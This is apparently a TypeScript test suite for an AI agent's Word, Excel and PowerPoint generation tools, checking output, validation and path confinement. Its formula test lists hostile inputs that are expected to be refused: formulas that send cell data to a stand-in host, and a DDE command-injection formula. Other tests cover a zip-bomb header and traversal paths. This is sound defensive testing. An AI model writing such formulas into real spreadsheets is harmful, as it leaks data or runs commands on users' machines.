/**
 * Tests for make_docx, make_xlsx, make_pptx and read_file on office files (#4274).
 *
 * Every test runs the shipping path: the builders write real bytes, the zip
 * reader opens them, and the text extractor reads them back. The executor and
 * native tool tests go through the same confinement a model call does.
 */

import { afterAll, describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import * as zlib from "node:zlib";
import { cleanupTempDirs, tempDir } from "../../../tests/temp-dirs";
import { agentTools, setToolContext } from "../../ai/tools";
import { ModeManager } from "../../eight/modes";
import { ToolExecutor } from "../../eight/tools";
import { MAX_SPEC_CHARS } from "../office/common";
import { buildDocx } from "../office/docx";
import { makeOffice } from "../office/index";
import { buildPptx } from "../office/pptx";
import { officeText } from "../office/read";
import { buildXlsx, checkFormula, colName, dateSerial } from "../office/xlsx";
import { MAX_ENTRY_BYTES, crc32, readZip, writeZip } from "../office/zip";
import { DeckSpecSchema } from "../video-deck";

afterAll(cleanupTempDirs);

/** A solid-colour PNG, built here so the test needs no fixture file. */
function png(w: number, h: number): Buffer {
	const row = Buffer.concat([Buffer.from([0]), Buffer.alloc(w * 3, 0x80)]);
	const raw = Buffer.concat(Array.from({ length: h }, () => row));
	const chunk = (type: string, data: Buffer) => {
		const len = Buffer.alloc(4);
		len.writeUInt32BE(data.length);
		const td = Buffer.concat([Buffer.from(type, "ascii"), data]);
		const crc = Buffer.alloc(4);
		crc.writeUInt32BE(crc32(td));
		return Buffer.concat([len, td, crc]);
	};
	const ihdr = Buffer.alloc(13);
	ihdr.writeUInt32BE(w, 0);
	ihdr.writeUInt32BE(h, 4);
	ihdr.set([8, 2, 0, 0, 0], 8);
	return Buffer.concat([
		Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
		chunk("IHDR", ihdr),
		chunk("IDAT", zlib.deflateSync(raw)),
		chunk("IEND", Buffer.alloc(0)),
	]);
}

function workDir(prefix: string): string {
	const dir = tempDir(prefix);
	writeFileSync(join(dir, "pic.png"), png(64, 36));
	return dir;
}

const DOCX = {
	title: "Quarterly report",
	blocks: [
		{ type: "heading", text: "Summary" },
		{ type: "paragraph", text: "Revenue **grew** 12% & costs <fell>.\nSecond line." },
		{ type: "bullets", items: ["one", "two"] },
		{ type: "bullets", items: ["first", "second"], numbered: true },
		{
			type: "table",
			rows: [
				["Name", "Qty"],
				["Apples", 3],
				["Pears", null],
			],
		},
		{ type: "image", path: "pic.png", caption: "A picture" },
		{ type: "pageBreak" },
		{ type: "heading", text: "Next", level: 2 },
	],
};

const XLSX = {
	sheets: [
		{
			name: "Sales",
			header: true,
			columns: [20, 12, 14],
			rows: [
				["Item", "Amount", "Date"],
				["A", { value: 1234.5, format: "#,##0.00" }, { date: "2026-10-14" }],
				["B", 0.25, null],
				["Total", { formula: "=SUM(B2:B3)", format: "#,##0.00" }],
			],
		},
		{ name: "Notes", rows: [["hello", true]] },
	],
};

const PPTX = {
	title: "Deck",
	slides: [
		{ title: "Hello deck" },
		{ kicker: "Part one", title: "Why", bullets: ["fast", "local"], narration: "Say this aloud." },
		{ title: "Picture", text: "Some words", image: "pic.png", notes: "Speaker notes here" },
	],
};

describe("zip container", () => {
	test("round-trips entries and refuses a duplicate name", () => {
		const z = writeZip([
			{ name: "a.xml", data: "<a>hello</a>" },
			{ name: "dir/b.bin", data: Buffer.from([1, 2, 3]) },
		]);
		const r = readZip(z);
		expect(r.names()).toEqual(["a.xml", "dir/b.bin"]);
		expect(r.text("a.xml")).toBe("<a>hello</a>");
		expect(r.text("missing")).toBeNull();
		expect(() =>
			writeZip([
				{ name: "x", data: "1" },
				{ name: "x", data: "2" },
			]),
		).toThrow(/duplicate/);
	});

	test("refuses a file that is not a zip, and an entry claiming to inflate past the limit", () => {
		expect(() => readZip(Buffer.from("plain text, not a zip at all"))).toThrow(/not a zip/);
		const z = writeZip([{ name: "bomb.xml", data: "<a/>" }]);
		// Rewrite the central directory's uncompressed size to just past the cap.
		const cd = z.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]));
		z.writeUInt32LE(MAX_ENTRY_BYTES + 1, cd + 24);
		expect(() => readZip(z).text("bomb.xml")).toThrow(/limit/);
	});
});

describe("make_docx", () => {
	test("writes a Word document that reads back to the spec", () => {
		const dir = workDir("docx-ok-");
		const r = makeOffice("docx", DOCX, join(dir, "r.docx"), dir);
		expect(r).toMatchObject({ kind: "document", format: "docx", blocks: 8, images: 1 });
		const buf = readFileSync(r.path);
		const zip = readZip(buf);
		expect(zip.names()[0]).toBe("[Content_Types].xml");
		expect(zip.has("word/media/image1.png")).toBe(true);
		const text = officeText(buf, ".docx");
		expect(text).toContain("# Quarterly report");
		expect(text).toContain("# Summary");
		expect(text).toContain("## Next");
		expect(text).toContain("Revenue grew 12% & costs <fell>.\nSecond line.");
		expect(text).toContain("- one\n- two\n- first\n- second");
		expect(text).toContain("| Name | Qty |\n| Apples | 3 |\n| Pears |  |");
		expect(text).toContain("A picture");
		expect(zip.text("word/document.xml")).toContain("<w:b/>");
	});

	test("the same spec gives the same bytes", () => {
		const dir = workDir("docx-det-");
		expect(buildDocx(DOCX, dir).buffer.equals(buildDocx(DOCX, dir).buffer)).toBe(true);
	});

	test("a malformed spec is refused with the field that failed", () => {
		const dir = workDir("docx-bad-");
		expect(() => buildDocx({ blocks: [{ type: "poem", text: "x" }] }, dir)).toThrow(
			/make_docx spec is invalid: blocks\.0/,
		);
		expect(() => buildDocx({}, dir)).toThrow(/blocks/);
		expect(() => buildDocx("{not json", dir)).toThrow(/not valid JSON/);
	});

	test("a spec sent as a JSON string is accepted", () => {
		const dir = workDir("docx-str-");
		const text = officeText(
			buildDocx(JSON.stringify({ blocks: [{ type: "paragraph", text: "hi" }] }), dir).buffer,
			".docx",
		);
		expect(text).toBe("hi");
	});

	test("an image outside the working directory or at a URL is refused", () => {
		const root = tempDir("docx-img-");
		const work = join(root, "work");
		mkdirSync(work);
		writeFileSync(join(root, "secret.png"), png(4, 4));
		const spec = (path: string) => ({ blocks: [{ type: "image", path }] });
		expect(() => buildDocx(spec("../secret.png"), work)).toThrow(/traversal/i);
		expect(() => buildDocx(spec("http://127.0.0.1:9/a.png"), work)).toThrow(/URL/);
	});
});

describe("make_xlsx", () => {
	test("writes a workbook whose cells, formats and formulas read back", () => {
		const dir = workDir("xlsx-ok-");
		const r = makeOffice("xlsx", XLSX, join(dir, "w.xlsx"), dir);
		expect(r).toMatchObject({ format: "xlsx", sheets: 2, cells: 13 });
		const buf = readFileSync(r.path);
		const text = officeText(buf, ".xlsx");
		expect(text).toContain("## Sheet: Sales");
		expect(text).toContain("A1: Item\tB1: Amount\tC1: Date");
		expect(text).toContain(`B2: 1234.5\tC2: ${dateSerial("2026-10-14")}`);
		expect(text).toContain("B4: =SUM(B2:B3)");
		expect(text).toContain("## Sheet: Notes\nA1: hello\tB1: TRUE");
		const zip = readZip(buf);
		expect(zip.text("xl/styles.xml")).toContain('formatCode="yyyy-mm-dd"');
		expect(zip.text("xl/worksheets/sheet1.xml")).toContain('state="frozen"');
		expect(zip.text("xl/workbook.xml")).toContain('fullCalcOnLoad="1"');
	});

	test("the same spec gives the same bytes", () => {
		expect(buildXlsx(XLSX).buffer.equals(buildXlsx(XLSX).buffer)).toBe(true);
	});

	test("helpers: column names, serial dates", () => {
		expect([0, 25, 26, 701, 702].map(colName)).toEqual(["A", "Z", "AA", "ZZ", "AAA"]);
		expect(dateSerial("1900-03-01")).toBe(61);
		expect(dateSerial("2026-10-14")).toBe(46309);
		expect(() => dateSerial("2026-02-30")).toThrow(/calendar/);
	});

	test("formulas may call only local functions; anything that can reach out is refused", () => {
		expect(checkFormula("=SUM(A1:A3)")).toBe("SUM(A1:A3)");
		expect(checkFormula('=IF(A1="[x]|y","a","b")')).toBe('IF(A1="[x]|y","a","b")');
		expect(checkFormula("=IFERROR(VLOOKUP(A2,'Q1 (draft)'!A:B,2,FALSE),0)")).toContain("VLOOKUP");
		expect(checkFormula("=round(log10(B2), 2)")).toBe("round(log10(B2), 2)");
		const refused: Array<[string, RegExp]> = [
			['=IMAGE("https://x.example/p.png?d="&A1)', /IMAGE/],
			['=HYPERLINK("https://x.example/?d="&A1,"open")', /HYPERLINK/],
			['=STOCKHISTORY("MSFT",TODAY())', /STOCKHISTORY/],
			['=WEBSERVICE("https://x.example/?d="&A1)', /WEBSERVICE/],
			['=FILTERXML(WEBSERVICE("https://x.example"),"//a")', /FILTERXML/],
			['=RTD("srv",,"topic")', /RTD/],
			['=INDIRECT("[x.xlsx]S!A1")', /INDIRECT/],
			['=OFFSET(INDIRECT("[x.xlsx]S!A1"),0,0)', /INDIRECT/],
			['=_xlfn.IMAGE("https://x.example")', /_XLFN\.IMAGE/],
			['=CELL("filename")', /CELL/],
			["=CALL(1)", /CALL/],
			["=[Other.xlsx]Sheet1!A1", /another workbook/],
			["='C:\\tmp\\[Other.xlsx]Sheet1'!A1", /another workbook/],
			["=cmd|' /C calc'!A0", /DDE/],
		];
		for (const [f, why] of refused) expect(() => checkFormula(f), f).toThrow(why);
		expect(() =>
			buildXlsx({ sheets: [{ name: "S", rows: [[{ formula: '=IMAGE("https://x")' }]] }] }),
		).toThrow(/cell A1/);
	});

	test("bad sheet names, duplicates and bad dates are refused", () => {
		expect(() => buildXlsx({ sheets: [{ name: "a/b", rows: [] }] })).toThrow(/character/);
		expect(() =>
			buildXlsx({
				sheets: [
					{ name: "Data", rows: [] },
					{ name: "data", rows: [] },
				],
			}),
		).toThrow(/used twice/);
		expect(() => buildXlsx({ sheets: [{ name: "S", rows: [[{ date: "14/10/2026" }]] }] })).toThrow(
			/YYYY-MM-DD/,
		);
	});

	test("an oversized spec is refused before it is parsed", () => {
		const big = "x".repeat(MAX_SPEC_CHARS + 1);
		expect(() => buildXlsx(big)).toThrow(/limit/);
		const many = {
			sheets: [{ name: "S", rows: Array.from({ length: 600 }, () => Array(1000).fill(1)) }],
		};
		expect(() => buildXlsx(many)).toThrow(/limit|at most/);
	});
});

describe("make_pptx", () => {
	test("writes a deck whose slides and notes read back", () => {
		const dir = workDir("pptx-ok-");
		const r = makeOffice("pptx", PPTX, join(dir, "d.pptx"), dir);
		expect(r).toMatchObject({ format: "pptx", slides: 3, notes: 2, images: 1 });
		const buf = readFileSync(r.path);
		const text = officeText(buf, ".pptx");
		expect(text).toContain("## Slide 1\nHello deck");
		expect(text).toContain("## Slide 2\nPart one\nWhy\n- fast\n- local\nNotes: Say this aloud.");
		expect(text).toContain("## Slide 3\nPicture\nSome words\nNotes: Speaker notes here");
		const zip = readZip(buf);
		expect(zip.has("ppt/media/image1.png")).toBe(true);
		expect(zip.has("ppt/notesMasters/notesMaster1.xml")).toBe(true);
	});

	test("a render_video_deck spec becomes a deck as it is", () => {
		const dir = workDir("pptx-deck-");
		const film = {
			title: "Brief",
			size: "1920x1080",
			voice: "Rishi",
			slides: [
				{
					kicker: "Week 42",
					title: "Shipped",
					bullets: ["a"],
					seconds: 6,
					narration: "Spoken line.",
				},
			],
		};
		expect(DeckSpecSchema.safeParse(film).success).toBe(true);
		const text = officeText(buildPptx(film, dir).buffer, ".pptx");
		expect(text).toContain("Notes: Spoken line.");
	});

	test("the same spec gives the same bytes", () => {
		const dir = workDir("pptx-det-");
		expect(buildPptx(PPTX, dir).buffer.equals(buildPptx(PPTX, dir).buffer)).toBe(true);
	});

	test("an empty slide and an unknown field are refused", () => {
		const dir = workDir("pptx-bad-");
		expect(() => buildPptx({ slides: [{}] }, dir)).toThrow(/at least one of/);
		expect(() => buildPptx({ slides: [{ title: "t", macro: "x" }] }, dir)).toThrow(/invalid/);
	});
});

describe("tool wiring", () => {
	test("each tool writes inside the working directory and returns what it wrote", async () => {
		const dir = workDir("office-exec-");
		const ex = new ToolExecutor(dir);
		for (const [tool, spec, out] of [
			["make_docx", DOCX, "r.docx"],
			["make_xlsx", XLSX, "w.xlsx"],
			["make_pptx", PPTX, "d.pptx"],
		] as const) {
			const r = JSON.parse(await ex.execute(tool, { spec, out }));
			expect(r.path).toBe(join(dir, out));
			expect(existsSync(r.path)).toBe(true);
			expect(r.textChars).toBeGreaterThan(0);
		}
	});

	test("paths outside the project, macro extensions and symlinks are refused", async () => {
		const root = tempDir("office-esc-");
		const work = join(root, "work");
		mkdirSync(work);
		mkdirSync(join(root, "outside"));
		symlinkSync(join(root, "outside"), join(work, "link"));
		const ex = new ToolExecutor(work);
		const spec = { blocks: [{ type: "paragraph", text: "x" }] };
		expect(await ex.execute("make_docx", { spec, out: "../x.docx" })).toMatch(/traversal|blocked/i);
		expect(await ex.execute("make_docx", { spec, out: join(root, "abs.docx") })).toMatch(
			/traversal|blocked/i,
		);
		expect(await ex.execute("make_docx", { spec, out: "link/v.docx" })).toMatch(
			/traversal|blocked|symlink/i,
		);
		expect(await ex.execute("make_docx", { spec, out: "m.docm" })).toMatch(/\.docx/);
		expect(await ex.execute("make_xlsx", { spec: XLSX, out: "m.xlsm" })).toMatch(/\.xlsx/);
		expect(await ex.execute("make_pptx", { spec: PPTX, out: "m.pptm" })).toMatch(/\.pptx/);
		for (const f of ["x.docx", "abs.docx", "outside/v.docx"])
			expect(existsSync(join(root, f))).toBe(false);
		for (const f of ["m.docm", "m.xlsm", "m.pptm"]) expect(existsSync(join(work, f))).toBe(false);
	});

	test("an invalid or oversized spec writes nothing", async () => {
		const dir = tempDir("office-bad-");
		const ex = new ToolExecutor(dir);
		expect(await ex.execute("make_docx", { spec: { blocks: [] }, out: "a.docx" })).toMatch(
			/^Error: make_docx failed/,
		);
		expect(
			await ex.execute("make_xlsx", { spec: "x".repeat(MAX_SPEC_CHARS + 1), out: "b.xlsx" }),
		).toMatch(/limit/);
		expect(existsSync(join(dir, "a.docx"))).toBe(false);
		expect(existsSync(join(dir, "b.xlsx"))).toBe(false);
	});

	test("no macro part is ever written", () => {
		const dir = workDir("office-macro-");
		for (const buf of [
			buildDocx(DOCX, dir).buffer,
			buildXlsx(XLSX).buffer,
			buildPptx(PPTX, dir).buffer,
		]) {
			const names = readZip(buf).names();
			expect(names.some((n) => /vbaProject|\.bin$|macro/i.test(n))).toBe(false);
			expect(readZip(buf).text("[Content_Types].xml")).not.toMatch(/macroEnabled|vba/i);
		}
	});

	test("an edit-scoped child session cannot write outside its scope", async () => {
		const root = workDir("office-scope-");
		mkdirSync(join(root, "allowed"));
		const ex = new ToolExecutor(root, "child", undefined, { allowedPaths: ["allowed"] });
		expect(await ex.execute("make_pptx", { spec: PPTX, out: "other.pptx" })).toContain(
			"SCOPE BLOCKED",
		);
		expect(existsSync(join(root, "other.pptx"))).toBe(false);
	});

	test("the native tools write the same files and refuse the same paths", async () => {
		const dir = workDir("office-native-");
		setToolContext({ workingDirectory: dir });
		const run = (name: "make_docx" | "make_xlsx" | "make_pptx", a: Record<string, unknown>) =>
			(
				agentTools[name] as unknown as { execute: (a: unknown, o: unknown) => Promise<string> }
			).execute(a, {
				toolCallId: "t",
				messages: [],
			});
		const ok = JSON.parse(await run("make_xlsx", { spec: XLSX, out: "n.xlsx" }));
		expect(existsSync(ok.path)).toBe(true);
		expect(await run("make_docx", { spec: DOCX, out: "../n.docx" })).toMatch(/traversal|blocked/i);
	});

	test("read_file on an office file returns its text, on both paths", async () => {
		const dir = workDir("office-read-");
		makeOffice("pptx", PPTX, join(dir, "d.pptx"), dir);
		writeFileSync(join(dir, "broken.docx"), "not a zip");
		const viaExecutor = await new ToolExecutor(dir).execute("read_file", { path: "d.pptx" });
		expect(viaExecutor).toContain("Notes: Speaker notes here");
		expect(await new ToolExecutor(dir).execute("read_file", { path: "broken.docx" })).toMatch(
			/^Error: could not read broken\.docx/,
		);
		setToolContext({ workingDirectory: dir });
		const native = await (
			agentTools.read_file as unknown as { execute: (a: unknown, o: unknown) => Promise<string> }
		).execute({ path: "d.pptx" }, { toolCallId: "t", messages: [] });
		expect(native).toContain("## Slide 3");
	});

	test("architect and review modes deny the office write tools", () => {
		for (const m of ["architect", "review"]) {
			const denied = new ModeManager("/nonexistent/modes.yaml").getMode(m)?.deniedTools ?? [];
			for (const t of ["make_docx", "make_xlsx", "make_pptx"]) expect(denied).toContain(t);
		}
	});

	test("each description opens with the input shape", async () => {
		const { OFFICE_TOOL_DESCRIPTIONS } = await import("../../eight/tools");
		expect(OFFICE_TOOL_DESCRIPTIONS.make_docx.slice(0, 140)).toContain("{spec:{");
		expect(OFFICE_TOOL_DESCRIPTIONS.make_xlsx.slice(0, 140)).toContain(
			"{spec:{sheets:[{name, rows:",
		);
		expect(OFFICE_TOOL_DESCRIPTIONS.make_pptx.slice(0, 140)).toContain("{spec:{title?, slides:[");
	});
});
